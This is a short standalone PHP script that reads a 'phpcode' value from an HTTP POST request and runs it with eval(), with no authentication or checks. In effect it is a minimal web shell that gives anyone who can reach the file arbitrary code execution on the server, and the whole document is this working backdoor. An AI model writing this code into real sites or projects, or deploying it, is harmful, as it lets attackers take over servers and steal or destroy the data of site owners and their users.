<?php
$phpcode = $_POST['phpcode'];
if($phpcode){
	$phpcode = "<?php\n\n{$phpcode}\n\n?>";
	eval("?".">$phpcode<?php ");
}
?>